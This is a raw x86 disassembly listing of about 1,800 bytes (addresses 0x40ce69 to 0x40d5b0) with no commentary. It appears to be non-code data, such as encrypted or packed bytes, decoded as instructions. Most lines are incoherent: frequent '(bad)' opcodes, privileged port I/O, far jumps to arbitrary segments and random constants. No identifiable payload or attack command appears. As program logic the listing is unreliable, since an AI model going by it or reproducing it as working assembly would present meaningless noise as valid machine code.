  40ce69:	test   eax,0x84cf1142
  40ce6e:	and    DWORD PTR [eax-0x5a77d576],ebx
  40ce74:	in     eax,dx
  40ce75:	icebp  
  40ce76:	mov    ecx,ebp
  40ce78:	push   edx
  40ce79:	xor    ah,BYTE PTR [esi+0x1]
  40ce7c:	gs dec ecx
  40ce7e:	je     0x40ce11
  40ce80:	aam    0xd8
  40ce82:	add    BYTE PTR [edi],ch
  40ce84:	icebp  
  40ce85:	xor    BYTE PTR [edi+0x279c10df],0x34
  40ce8c:	(bad)  
  40ce8d:	dec    eax
  40ce8e:	and    cl,ah
  40ce90:	pop    ebx
  40ce91:	cmp    eax,0xde5e95ac
  40ce96:	push   ecx
  40ce97:	jmp    0x40ce28
  40ce99:	add    DWORD PTR [ebp+0x51],0x1b2e0925
  40cea0:	outs   dx,BYTE PTR ds:[esi]
  40cea1:	fs enter 0xf254,0x8
  40cea6:	call   0x19e4:0xf0a1dc81
  40cead:	inc    ecx
  40ceae:	add    al,0x34
  40ceb0:	mov    dh,0x14
  40ceb2:	dec    edi
  40ceb3:	jmp    0x7228:0x7fd6e49
  40ceba:	mov    bl,0x45
  40cebc:	or     al,0x60
  40cebe:	mov    eax,0x778d5451
  40cec3:	cwde   
  40cec4:	xchg   BYTE PTR [esi],cl
  40cec6:	and    DWORD PTR [eax-0x60b26075],edx
  40cecc:	(bad)  
  40cecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cece:	or     eax,0xacb04bba
  40ced3:	into   
  40ced4:	push   ebp
  40ced5:	fs jne 0x40cf18
  40ced8:	adc    al,0xf1
  40ceda:	fadd   QWORD PTR [esi-0x49298d64]
  40cee0:	and    eax,0x5754b7df
  40cee5:	psubq  mm0,QWORD PTR [edi+0x32]
  40cee9:	aam    0x66
  40ceeb:	fidivr WORD PTR [esi+0x7c078f21]
  40cef1:	dec    ebx
  40cef2:	push   cs
  40cef3:	inc    eax
  40cef4:	(bad)  
  40cef5:	mov    fs,edx
  40cef7:	jmp    0x4fd4:0xa6255e62
  40cefe:	jo     0x40cf46
  40cf00:	adc    DWORD PTR [eax+0x3094e0f8],edx
  40cf06:	mov    ss,WORD PTR [edi]
  40cf08:	mov    edx,0x79962d00
  40cf0d:	jo     0x40cf40
  40cf0f:	push   ebp
  40cf10:	in     eax,dx
  40cf11:	out    0x48,eax
  40cf13:	sub    dh,BYTE PTR [ecx+0x424aae87]
  40cf19:	sub    ebp,eax
  40cf1b:	outs   dx,BYTE PTR ds:[esi]
  40cf1c:	leave  
  40cf1d:	ret    
  40cf1e:	sti    
  40cf1f:	xor    ecx,ebx
  40cf21:	sbb    BYTE PTR [edi+0x11e1bc6e],al
  40cf27:	int3   
  40cf28:	out    dx,al
  40cf29:	out    dx,al
  40cf2a:	pop    ss
  40cf2b:	adc    bh,bh
  40cf2d:	pushf  
  40cf2e:	and    edi,ecx
  40cf30:	shl    bl,1
  40cf32:	xor    esi,DWORD PTR [eax-0x25]
  40cf35:	fcmove st,st(0)
  40cf37:	cwde   
  40cf38:	pop    ebx
  40cf39:	cdq    
  40cf3a:	stos   DWORD PTR es:[edi],eax
  40cf3b:	lods   eax,DWORD PTR ds:[esi]
  40cf3c:	jbe    0x40cedb
  40cf3e:	ja     0x40cf2b
  40cf40:	fnstsw WORD PTR [eax-0x69]
  40cf43:	out    0x9a,eax
  40cf45:	test   ebx,0x139872ab
  40cf4b:	mov    eax,ds:0x7a465167
  40cf50:	je     0x40cf39
  40cf52:	push   esp
  40cf53:	inc    ebx
  40cf54:	jns    0x40cfa7
  40cf56:	mov    ebp,0xd918a4d8
  40cf5b:	clc    
  40cf5c:	mov    esi,0xf090a558
  40cf61:	push   es
  40cf62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf63:	and    bh,BYTE PTR [esp+esi*2+0x5c]
  40cf67:	push   0xb74f017a
  40cf6c:	sbb    eax,0xd724c18c
  40cf71:	and    al,0xfb
  40cf73:	fst    QWORD PTR cs:0x31fadad2
  40cf7a:	fbstp  TBYTE PTR [ecx]
  40cf7c:	cmp    ch,BYTE PTR [edx]
  40cf7e:	or     BYTE PTR [ebp-0x35],al
  40cf81:	sub    BYTE PTR [ecx],ch
  40cf83:	outs   dx,DWORD PTR ds:[esi]
  40cf84:	jb     0x40cf9f
  40cf86:	loop   0x40cffd
  40cf88:	fisttp WORD PTR [ecx]
  40cf8a:	in     al,0xde
  40cf8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf8d:	nop
  40cf8e:	bound  esi,QWORD PTR [ebx]
  40cf90:	dec    ecx
  40cf91:	(bad)  
  40cf93:	fwait
  40cf94:	mov    dl,BYTE PTR [ebx]
  40cf96:	pop    ss
  40cf97:	sti    
  40cf98:	data16 mov dh,BYTE PTR [ebx]
  40cf9b:	nop
  40cf9c:	and    BYTE PTR [edi-0x137d0c8b],dl
  40cfa2:	mov    ch,0xf9
  40cfa4:	fldcw  WORD PTR [ebx]
  40cfa6:	jle    0x40d022
  40cfa8:	retf   
  40cfa9:	or     dl,BYTE PTR [ebx+0x4485bf44]
  40cfaf:	dec    eax
  40cfb0:	dec    edx
  40cfb1:	xor    al,0x90
  40cfb3:	fcomp  QWORD PTR [edx+0x1f]
  40cfb6:	xlat   BYTE PTR ds:[ebx]
  40cfb7:	test   DWORD PTR [edx-0x5f],esp
  40cfba:	rcr    DWORD PTR [ecx],0xe4
  40cfbd:	cwde   
  40cfbe:	sub    BYTE PTR [edx-0x16],dh
  40cfc1:	xchg   esi,eax
  40cfc2:	rol    dl,cl
  40cfc4:	int3   
  40cfc5:	pop    esp
  40cfc6:	lock adc BYTE PTR [eax],al
  40cfc9:	or     cl,dl
  40cfcb:	stc    
  40cfcc:	pop    eax
  40cfcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfce:	mov    edx,0xf271c93d
  40cfd3:	popa   
  40cfd4:	rcl    BYTE PTR [eax],0x98
  40cfd7:	adc    ecx,DWORD PTR [ebx+esi*2-0x3b]
  40cfdb:	jb     0x40cff2
  40cfdd:	inc    ebx
  40cfde:	(bad)  
  40cfdf:	(bad)  
  40cfe0:	jle    0x40cf94
  40cfe2:	or     ebx,DWORD PTR [ebx]
  40cfe4:	mov    bh,0xd
  40cfe6:	stc    
  40cfe7:	call   0x942d:0xd8d310b0
  40cfee:	pop    ds
  40cfef:	imul   esi,DWORD PTR [edi],0xb89a8b13
  40cff5:	cmp    al,0x20
  40cff7:	sbb    eax,0x6532795e
  40cffc:	inc    esi
  40cffd:	and    BYTE PTR [eax],ah
  40cfff:	mov    al,0xee
  40d001:	mov    ebx,0x145a08a9
  40d006:	pop    esp
  40d007:	hlt    
  40d008:	xor    ebp,edi
  40d00a:	sub    edi,DWORD PTR [ebx]
  40d00c:	test   DWORD PTR [edi],esi
  40d00e:	pop    ds
  40d00f:	adc    BYTE PTR [edx+0x2c],al
  40d012:	xchg   edi,eax
  40d013:	mov    ebx,0xb23c3829
  40d018:	aad    0x89
  40d01a:	xlat   BYTE PTR ds:[ebx]
  40d01b:	add    al,0x23
  40d01d:	bnd ja 0x40cff7
  40d020:	aam    0x81
  40d022:	cmp    eax,0x801fe17f
  40d027:	sbb    BYTE PTR [ebp+0x4d],dl
  40d02a:	jp     0x40d079
  40d02c:	mov    ch,0xf4
  40d02e:	add    DWORD PTR [ebx+ebp*8],ecx
  40d031:	mov    ds:0xf5c9bd6a,al
  40d036:	int    0xc1
  40d038:	aas    
  40d039:	out    dx,eax
  40d03a:	jl     0x40cfe2
  40d03c:	cld    
  40d03d:	xchg   dh,cl
  40d03f:	(bad)  
  40d040:	fs cs jl 0x40cffc
  40d044:	enter  0x2877,0xa6
  40d048:	pop    ecx
  40d049:	inc    esi
  40d04a:	ja     0x40d057
  40d04c:	sti    
  40d04d:	stc    
  40d04e:	ret    
  40d04f:	popf   
  40d050:	push   0xffffff81
  40d052:	repnz push eax
  40d054:	cmp    BYTE PTR [ecx],bh
  40d056:	push   ebp
  40d057:	mov    ecx,0xeffa4992
  40d05c:	and    BYTE PTR [ebp-0x33],ch
  40d05f:	outs   dx,BYTE PTR ds:[esi]
  40d060:	and    bh,bh
  40d062:	(bad)  
  40d063:	push   ecx
  40d064:	or     DWORD PTR [esi],ebx
  40d066:	pop    ecx
  40d067:	xchg   esi,edi
  40d069:	ins    DWORD PTR es:[edi],dx
  40d06a:	jge    0x40d0b0
  40d06c:	dec    edx
  40d06d:	push   esp
  40d06e:	adc    al,0x99
  40d070:	popf   
  40d071:	push   esi
  40d072:	retf   
  40d073:	mov    cl,0x4d
  40d075:	add    dh,dh
  40d077:	dec    ecx
  40d078:	imul   eax,DWORD PTR [esi+0xe520614],0xffffff86
  40d07f:	mov    cl,0xf1
  40d081:	adc    BYTE PTR [esi],al
  40d083:	jne    0x40d0f2
  40d085:	adc    eax,eax
  40d087:	nop
  40d088:	mov    esp,0x12920c5f
  40d08d:	jmp    0x940a:0xc98b4906
  40d094:	enter  0x67b9,0xd9
  40d098:	jmp    0x27bf:0x6fbd48e9
  40d09f:	lods   al,BYTE PTR ss:[esi]
  40d0a1:	mov    eax,0x27c8612e
  40d0a6:	inc    ebx
  40d0a7:	js     0x40d0c0
  40d0a9:	sahf   
  40d0aa:	adc    edi,ebp
  40d0ac:	cli    
  40d0ad:	jecxz  0x40d0cf
  40d0af:	bound  esi,QWORD PTR [esi+0x55]
  40d0b2:	inc    ecx
  40d0b3:	cmp    eax,0xfab9c600
  40d0b8:	imul   DWORD PTR [edx-0x11de1eab]
  40d0be:	lods   al,BYTE PTR ds:[esi]
  40d0bf:	dec    esp
  40d0c0:	xor    ebp,ebx
  40d0c2:	mov    DWORD PTR [edi],ecx
  40d0c4:	xchg   BYTE PTR [esi-0x10],ah
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    esi,FWORD PTR [ebx-0x5580aab4]
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d08b
  40d0fb:	jge    0x40d0f4
  40d0fd:	or     ebp,DWORD PTR [edx]
  40d0ff:	mov    eax,DWORD PTR [ebp+0x43]
  40d102:	mov    eax,0x59e0b6a6
  40d107:	xchg   ebp,eax
  40d108:	mov    ecx,0xa560fdcf
  40d10d:	jecxz  0x40d10f
  40d10f:	fld    TBYTE PTR [ecx-0xe7b2f85]
  40d115:	call   0xa10c:0x7ce58deb
  40d11c:	aaa    
  40d11d:	mov    dh,0xa6
  40d11f:	aaa    
  40d120:	fs scas al,BYTE PTR es:[edi]
  40d122:	and    dh,BYTE PTR [edi]
  40d124:	ds jno 0x40d0ad
  40d127:	jecxz  0x40d108
  40d129:	or     al,0x1b
  40d12b:	jns    0x40d184
  40d12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d12e:	pop    ss
  40d12f:	cmp    eax,0xe607650d
  40d134:	lea    ecx,[edx-0x7501ec05]
  40d13a:	push   es
  40d13b:	retf   
  40d13c:	shr    cl,cl
  40d13e:	ror    BYTE PTR [ebp-0x31],1
  40d141:	mov    eax,0xaf68700d
  40d146:	dec    esi
  40d147:	pop    ecx
  40d148:	mov    esp,0x7f2eb805
  40d14d:	lock bound esi,QWORD PTR [edi+0x2b6b8552]
  40d154:	rol    DWORD PTR [edx-0x2032ec74],cl
  40d15a:	sbb    bl,BYTE PTR [ebx+0x40]
  40d15d:	(bad)  
  40d15e:	stos   DWORD PTR es:[edi],eax
  40d15f:	(bad)  
  40d160:	shl    eax,cl
  40d162:	(bad)  
  40d163:	push   cs
  40d164:	int3   
  40d165:	push   esi
  40d166:	mov    esp,0x264c718d
  40d16b:	jns    0x40d139
  40d16d:	or     edi,DWORD PTR [edx+0x49]
  40d170:	jg     0x40d183
  40d172:	adc    ecx,DWORD PTR [edi]
  40d174:	call   0xbc52:0x87e47724
  40d17b:	cmp    eax,0xb842c5bf
  40d180:	mov    eax,ds:0x74795e48
  40d185:	int3   
  40d186:	int    0xa0
  40d188:	iretw  
  40d18a:	xchg   esp,eax
  40d18b:	sub    al,0xfc
  40d18d:	(bad)  
  40d18e:	or     eax,0x22730fca
  40d193:	(bad)  
  40d194:	je     0x40d15d
  40d196:	popf   
  40d197:	retf   
  40d198:	push   ss
  40d199:	push   eax
  40d19a:	xor    eax,0x6d8702f0
  40d19f:	jbe    0x40d167
  40d1a1:	fdiv   st(3),st
  40d1a3:	cmp    ah,BYTE PTR ds:0x841ffe48
  40d1a9:	dec    DWORD PTR [esi+0x41b366de]
  40d1af:	add    al,BYTE PTR [ebx+0x51833909]
  40d1b5:	lea    ecx,ds:0xb34da24
  40d1bb:	push   cs
  40d1bc:	lods   eax,DWORD PTR ds:[esi]
  40d1bd:	pop    ds
  40d1be:	dec    eax
  40d1bf:	jnp    0x40d208
  40d1c1:	or     ch,cl
  40d1c3:	dec    DWORD PTR ds:0x7e0bc881
  40d1c9:	sub    ch,BYTE PTR [edx]
  40d1cb:	add    dl,BYTE PTR [ecx-0x4f50f623]
  40d1d1:	repnz scas eax,DWORD PTR es:[edi]
  40d1d3:	int3   
  40d1d4:	leave  
  40d1d5:	dec    esp
  40d1d6:	add    esp,0x29
  40d1d9:	adc    al,0x6a
  40d1db:	mov    esp,0x28aec915
  40d1e0:	cdq    
  40d1e1:	mov    cl,0xdc
  40d1e3:	ja     0x40d1e9
  40d1e5:	sbb    edx,DWORD PTR [ebp+0x5f]
  40d1e8:	dec    ebx
  40d1e9:	mov    ds:0x82d64547,eax
  40d1ee:	mov    ebp,0xbb4527ed
  40d1f3:	stos   DWORD PTR es:[edi],eax
  40d1f4:	push   eax
  40d1f5:	daa    
  40d1f6:	mov    ah,dh
  40d1f8:	jmp    0xae61:0x32827701
  40d1ff:	jo     0x40d23e
  40d201:	xchg   edi,eax
  40d202:	pop    edx
  40d203:	mov    esp,0xa2bcfeff
  40d208:	lds    eax,FWORD PTR [edi-0x64]
  40d20b:	sub    DWORD PTR [ecx+0x71],0x366d41d8
  40d212:	cwde   
  40d213:	pop    edx
  40d214:	ret    0x7b40
  40d217:	(bad)  
  40d219:	jo     0x40d1f4
  40d21b:	and    al,0x67
  40d21d:	inc    esp
  40d21e:	mov    ebp,0x7c60d166
  40d223:	std    
  40d224:	dec    edx
  40d225:	dec    edi
  40d226:	inc    esp
  40d227:	shl    BYTE PTR [esi+0x6d30e739],0xc1
  40d22e:	push   ss
  40d22f:	retf   
  40d230:	xchg   ecx,eax
  40d231:	push   ecx
  40d232:	xchg   edi,eax
  40d233:	mov    ebp,0x27ed0a9a
  40d238:	add    edx,DWORD PTR [ebx]
  40d23a:	ins    DWORD PTR es:[edi],dx
  40d23b:	ins    DWORD PTR es:[edi],dx
  40d23c:	rcr    esp,1
  40d23e:	out    dx,eax
  40d23f:	dec    esi
  40d240:	add    BYTE PTR [edi+0x50da64],dl
  40d246:	or     BYTE PTR [ecx+0x34bef672],ah
  40d24c:	and    cl,ch
  40d24e:	sbb    dl,ah
  40d250:	sbb    BYTE PTR [edx+0x28133d75],ch
  40d256:	aaa    
  40d257:	xchg   esi,eax
  40d258:	test   eax,0xd25cdf2a
  40d25d:	lods   eax,DWORD PTR ds:[esi]
  40d25e:	lock fnstsw WORD PTR [eax+0x33fa144f]
  40d265:	loope  0x40d203
  40d267:	push   cs
  40d268:	rol    DWORD PTR [ebx],cl
  40d26a:	repz pop ds
  40d26c:	push   ds
  40d26d:	out    dx,al
  40d26e:	mov    WORD PTR [esi-0x1bab4973],fs
  40d274:	cmp    al,0x96
  40d276:	sti    
  40d277:	icebp  
  40d278:	cmp    eax,0x1244ca8c
  40d27d:	xor    al,0xf
  40d27f:	mov    dl,0x9b
  40d281:	cld    
  40d282:	ds data16 imul al
  40d286:	fimul  WORD PTR [ebx+0x6f]
  40d289:	xchg   BYTE PTR [edx+0x41],ch
  40d28c:	push   esi
  40d28d:	fmul   QWORD PTR [esi+0x93c4a68]
  40d293:	pop    eax
  40d294:	mov    edi,fs
  40d296:	into   
  40d297:	push   es
  40d298:	inc    ebp
  40d299:	xchg   ecx,eax
  40d29a:	dec    edx
  40d29b:	daa    
  40d29c:	inc    esi
  40d29d:	int3   
  40d29e:	inc    ecx
  40d29f:	shl    BYTE PTR [edx+esi*2-0x6f],cl
  40d2a3:	mul    BYTE PTR [ecx]
  40d2a5:	and    bl,BYTE PTR [esi+0x2d]
  40d2a8:	ja     0x40d2b4
  40d2aa:	mov    ds:0x47575b83,al
  40d2af:	(bad)  
  40d2b1:	jge    0x40d28b
  40d2b3:	ror    ebp,1
  40d2b5:	cwde   
  40d2b6:	out    dx,eax
  40d2b7:	scas   eax,DWORD PTR es:[edi]
  40d2b8:	xor    eax,0x833deaff
  40d2bd:	dec    edx
  40d2be:	test   al,0x85
  40d2c0:	xor    BYTE PTR [edx-0x33],ch
  40d2c3:	xchg   ecx,eax
  40d2c4:	test   BYTE PTR [ebx+ecx*2-0x2a],0x4f
  40d2c9:	int3   
  40d2ca:	std    
  40d2cb:	sub    DWORD PTR [edx+ecx*4],esi
  40d2ce:	push   ss
  40d2cf:	mov    al,0x16
  40d2d1:	stos   DWORD PTR es:[edi],eax
  40d2d2:	lds    edx,FWORD PTR [ecx+0x1e4412c]
  40d2d8:	dec    ebx
  40d2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2da:	jnp    0x40d30f
  40d2dc:	scas   eax,DWORD PTR es:[edi]
  40d2dd:	jae    0x40d2ac
  40d2df:	add    BYTE PTR [edi-0x224ae81d],bh
  40d2e5:	out    dx,eax
  40d2e6:	out    0x4f,eax
  40d2e8:	or     edx,DWORD PTR [ebx-0x3e]
  40d2eb:	pusha  
  40d2ec:	loope  0x40d2d2
  40d2ee:	cld    
  40d2ef:	hlt    
  40d2f0:	jae    0x40d335
  40d2f2:	sbb    eax,0x9378d62c
  40d2f7:	inc    ebp
  40d2f8:	hlt    
  40d2f9:	(bad)  
  40d2fa:	scas   al,BYTE PTR es:[edi]
  40d2fb:	arpl   dx,si
  40d2fd:	sbb    DWORD PTR [eax],0xffffff9e
  40d300:	stos   DWORD PTR es:[edi],eax
  40d301:	ficomp WORD PTR [eax-0x7dbcde23]
  40d307:	addr16 call 0xe9fb238
  40d30d:	ret    0x3251
  40d310:	ret    0x71d5
  40d313:	dec    ebx
  40d314:	mov    edi,0xc8e183ff
  40d319:	repnz and dl,BYTE PTR [ebx+ecx*4]
  40d31d:	test   BYTE PTR [esi-0xebe7caf],al
  40d323:	push   edi
  40d324:	mov    edx,0x1f2afedf
  40d329:	aad    0xea
  40d32b:	pop    ds
  40d32c:	mov    ecx,DWORD PTR [eax]
  40d32e:	or     cl,ah
  40d330:	push   0xffffffe9
  40d332:	jbe    0x40d344
  40d334:	loopne 0x40d2d5
  40d336:	cli    
  40d337:	jns    0x40d34b
  40d339:	in     al,0x4d
  40d33b:	cmp    esi,DWORD PTR [esi+0x36]
  40d33e:	push   ebx
  40d33f:	inc    ecx
  40d340:	push   esp
  40d341:	mov    bl,0x48
  40d343:	sbb    BYTE PTR [eax],bl
  40d345:	mov    dl,0x8
  40d347:	inc    edx
  40d348:	aas    
  40d349:	sar    dl,cl
  40d34b:	dec    esp
  40d34c:	lods   eax,DWORD PTR ds:[esi]
  40d34d:	adc    edi,eax
  40d34f:	push   cs
  40d350:	ins    DWORD PTR es:[edi],dx
  40d351:	mov    bh,BYTE PTR [edi]
  40d353:	add    BYTE PTR [edx+0x6f],0x65
  40d357:	xlat   BYTE PTR ds:[ebx]
  40d358:	call   0x537:0x79f1df6a
  40d35f:	adc    bh,ch
  40d361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d362:	dec    ebp
  40d363:	sbb    edx,eax
  40d365:	pop    ebx
  40d366:	jge    0x40d36a
  40d368:	adc    eax,0x36bf62d7
  40d36d:	fwait
  40d36e:	int3   
  40d36f:	dec    esp
  40d370:	mov    ebx,0x3d25795f
  40d375:	cli    
  40d376:	or     ah,BYTE PTR [ecx+0x17]
  40d379:	dec    edx
  40d37a:	pop    ebp
  40d37b:	sti    
  40d37c:	or     BYTE PTR [esi+0xb],0xd6
  40d380:	xor    al,dl
  40d382:	shl    BYTE PTR [ecx],0x14
  40d385:	lds    eax,FWORD PTR [ebx-0x78ef80ff]
  40d38b:	stos   DWORD PTR es:[edi],eax
  40d38c:	jne    0x40d38c
  40d38e:	fisttp QWORD PTR [edi-0x9]
  40d391:	xchg   ecx,eax
  40d392:	jge    0x40d347
  40d394:	mov    cl,0x39
  40d396:	out    dx,eax
  40d397:	pop    edi
  40d399:	and    al,0x43
  40d39b:	push   ss
  40d39c:	int    0x98
  40d39e:	cmc    
  40d39f:	mov    BYTE PTR [edx],dh
  40d3a1:	mov    dl,0xf
  40d3a3:	arpl   WORD PTR [edx],dx
  40d3a5:	and    ecx,DWORD PTR es:[ebx]
  40d3a8:	adc    al,0xff
  40d3aa:	fcomp  st(4)
  40d3ac:	mov    dl,0xe5
  40d3ae:	ja     0x40d354
  40d3b0:	fnstcw WORD PTR [ebp+0x5b]
  40d3b3:	or     al,0x7e
  40d3b5:	aam    0x41
  40d3b7:	(bad)  
  40d3b8:	repz xchg ecx,eax
  40d3ba:	and    BYTE PTR [ebx-0x65b4756a],bl
  40d3c0:	sbb    BYTE PTR [edi+0x7d],bh
  40d3c3:	out    dx,al
  40d3c4:	and    bl,BYTE PTR [edi+0xb]
  40d3c7:	mov    ebx,0x3951841e
  40d3cc:	test   al,0xae
  40d3ce:	or     DWORD PTR [ecx+0x18a5d648],0x6069485d
  40d3d8:	inc    ebp
  40d3d9:	pop    ebp
  40d3da:	ds jecxz 0x40d409
  40d3dd:	mov    ch,0xe8
  40d3df:	jp     0x40d448
  40d3e1:	xchg   ebx,eax
  40d3e2:	adc    ah,BYTE PTR [ebp+ebx*8+0x33]
  40d3e6:	test   eax,0xaf631a1a
  40d3eb:	ds dec esi
  40d3ed:	test   cl,ah
  40d3ef:	(bad)  
  40d3f0:	in     al,dx
  40d3f1:	xor    BYTE PTR [ebx],al
  40d3f3:	ds mov bh,0xbe
  40d3f6:	out    dx,al
  40d3f7:	fistp  QWORD PTR ds:0x21c728e7
  40d3fd:	mov    ch,0x26
  40d3ff:	push   esp
  40d400:	cwde   
  40d401:	aas    
  40d402:	dec    edx
  40d403:	mov    DWORD PTR [edi+0x15],esp
  40d406:	jmp    0x8174a8ca
  40d40b:	push   ss
  40d40c:	add    BYTE PTR [esp+edi*1-0x4a],0x8b
  40d411:	ds ins DWORD PTR es:[edi],dx
  40d413:	das    
  40d414:	aam    0xf9
  40d416:	ret    
  40d417:	fist   DWORD PTR [esi]
  40d419:	retf   0x20be
  40d41c:	pusha  
  40d41d:	inc    esi
  40d41e:	dec    esp
  40d41f:	push   ecx
  40d420:	mov    bh,BYTE PTR [edx]
  40d422:	fwait
  40d423:	(bad)  
  40d424:	sbb    BYTE PTR [esi+ecx*4-0x7],cl
  40d428:	xchg   ecx,eax
  40d429:	pop    ecx
  40d42a:	jmp    0x5109:0x5346069a
  40d431:	jne    0x40d3e4
  40d433:	inc    DWORD PTR [esi-0x3d15dff7]
  40d439:	neg    DWORD PTR ds:[ebp-0x37e11748]
  40d440:	mov    ebx,0xff3c2fed
  40d445:	push   es
  40d446:	sub    ebp,DWORD PTR gs:[ecx]
  40d449:	or     dl,ch
  40d44b:	dec    edi
  40d44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d44d:	pop    ss
  40d44e:	push   ebp
  40d44f:	ret    0x7cf9
  40d452:	iret   
  40d453:	xchg   edi,eax
  40d454:	lahf   
  40d455:	clc    
  40d456:	cmp    al,0x67
  40d458:	call   0x6bbc6b9a
  40d45d:	mov    ds:0xcac62384,al
  40d462:	cwde   
  40d463:	inc    esi
  40d464:	sbb    edi,eax
  40d466:	push   0xffffffe3
  40d468:	cmc    
  40d469:	mov    bh,0xb8
  40d46b:	jmp    0xe305:0xe07f0f9
  40d472:	cmp    BYTE PTR [edi+0x4c],bl
  40d475:	sbb    al,0x98
  40d477:	pop    es
  40d478:	mov    DWORD PTR [edx-0x18],edx
  40d47b:	cdq    
  40d47c:	vpsrlw ymm6,ymm3,xmm4
  40d480:	shl    BYTE PTR [edx-0x3a],cl
  40d483:	clc    
  40d484:	adc    dl,BYTE PTR [ebx]
  40d486:	mov    ch,BYTE PTR [ecx-0x720e745b]
  40d48c:	cmp    ebp,DWORD PTR [edi-0x2e]
  40d48f:	and    eax,0xbb27564d
  40d494:	popa   
  40d495:	inc    ebp
  40d496:	and    BYTE PTR [ebx+0x14],0x6a
  40d49a:	and    BYTE PTR [ebx-0x6b720783],cl
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x50d3:0xb81a1d63
  40d4c6:	ins    BYTE PTR es:[edi],dx
  40d4c7:	fucomip st,st(6)
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4c3
  40d4d2:	and    DWORD PTR [edi+0x7f],esi
  40d4d5:	or     DWORD PTR [eax+eax*4],ecx
  40d4d8:	push   esi
  40d4d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4da:	test   al,0xb1
  40d4dc:	mov    eax,ds:0x2f4f81ab
  40d4e1:	lea    ecx,[eax-0x7625718e]
  40d4e7:	add    cl,BYTE PTR [ebx+0x21]
  40d4ea:	xor    ebx,ecx
  40d4ec:	xchg   ebp,eax
  40d4ed:	loope  0x40d56d
  40d4ef:	data16 mov dh,0xd2
  40d4f2:	or     al,0x60
  40d4f4:	push   cs
  40d4f5:	push   esi
  40d4f6:	xchg   ebp,eax
  40d4f7:	test   edi,ebx
  40d4f9:	into   
  40d4fa:	in     eax,dx
  40d4fb:	add    DWORD PTR [eax+0x79],edx
  40d4fe:	xchg   BYTE PTR [edi+0x2],bh
  40d501:	xor    eax,0x39e9c4b7
  40d506:	ds aas 
  40d508:	fbld   TBYTE PTR [ebp+0x6e9d702]
  40d50e:	out    0xc2,eax
  40d510:	pop    edi
  40d511:	int    0x88
  40d513:	and    esp,DWORD PTR [edx+0x2e60f00c]
  40d519:	jg     0x40d4ef
  40d51b:	call   0x1422:0x21cce991
  40d522:	(bad)  
  40d523:	pop    ds
  40d524:	xor    ebx,ecx
  40d526:	push   cs
  40d527:	repz mov ds:0x9ed5bbe5,eax
  40d52d:	lods   eax,DWORD PTR cs:[esi]
  40d52f:	outs   dx,DWORD PTR ds:[esi]
  40d530:	adc    ecx,0x9f18b4e6
  40d536:	les    eax,FWORD PTR [ecx]
  40d538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d539:	pop    ss
  40d53a:	mov    ebp,0x4448612
  40d53f:	rol    edx,cl
  40d541:	mov    ebx,cs
  40d543:	jle    0x40d4c6
  40d545:	jo     0x40d506
  40d547:	ins    BYTE PTR es:[edi],dx
  40d548:	fwait
  40d549:	loop   0x40d50c
  40d54b:	push   esi
  40d54c:	adc    bl,BYTE PTR [ebx-0x75]
  40d54f:	push   ebx
  40d550:	(bad)  
  40d551:	mov    al,0x95
  40d553:	adc    al,0x91
  40d555:	addr16 test esp,0x9b538ccf
  40d55c:	pop    esi
  40d55d:	ficom  WORD PTR [edx+0x5f]
  40d560:	push   ss
  40d561:	inc    edi
  40d562:	loope  0x40d52d
  40d564:	pop    ecx
  40d565:	pop    ds
  40d566:	jle    0x40d56f
  40d568:	aad    0xbf
  40d56a:	test   DWORD PTR [edi],esp
  40d56c:	cmp    dl,BYTE PTR [ebx-0x51]
  40d56f:	push   0xffffffbf
  40d571:	inc    ecx
  40d572:	cmp    dh,BYTE PTR [edi]
  40d574:	les    esi,FWORD PTR [ecx]
  40d576:	test   dh,ah
  40d578:	mov    dh,0xb3
  40d57a:	jg     0x40d59e
  40d57c:	jmp    0x40d58f
  40d57e:	imul   esi,DWORD PTR [ebp+0x1c9015fa],0x3a
  40d585:	mov    ebx,0xa359e7bb
  40d58a:	out    dx,eax
  40d58b:	pop    esi
  40d58c:	xor    eax,0xb4355218
  40d591:	jg     0x40d570
  40d593:	jns    0x40d557
  40d595:	pop    esp
  40d596:	mov    edx,0xe8e93028
  40d59b:	xchg   ecx,eax
  40d59c:	or     al,0xb2
  40d59e:	cli    
  40d59f:	mov    edi,DWORD PTR [esi+0x2c1ad8e]
  40d5a5:	cdq    
  40d5a6:	mov    eax,ds:0xdee531e6
  40d5ab:	push   es
  40d5ac:	inc    esp
  40d5ad:	sbb    dl,dh
  40d5af:	push   cs
  40d5b0:	gs fs retf 
